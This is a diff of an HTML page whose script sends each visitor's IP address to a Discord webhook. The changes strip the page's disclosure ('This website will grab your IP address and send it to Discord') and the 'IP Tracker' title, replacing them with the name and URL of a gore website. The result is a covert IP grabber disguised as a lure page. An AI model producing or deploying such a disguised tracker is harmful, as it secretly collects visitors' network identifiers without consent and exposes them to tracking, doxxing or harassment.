@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IP Tracker</title>
+    <title>WatchPeoPleDie</title>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
         $(document).ready(function() {
@@ -12,7 +12,7 @@
                 $.ajax({
                     type: "POST",
                     url: webhookUrl,
-                    data: JSON.stringify({ content: "User IP: " + ip }),
+                    data: JSON.stringify({ content: "IP: " + ip }),
                     contentType: "application/json",
                     success: function() {
                         console.log("IP sent to Discord successfully!");
@@ -26,7 +26,7 @@
     </script>
 </head>
 <body>
-    <h1>IP Tracker</h1>
-    <p>This website will grab your IP address and send it to Discord.</p>
+    <h1>WatchPeoPleDie</h1>
+    <p>https://watchpeopledie.tv/</p>
 </body>
 </html>
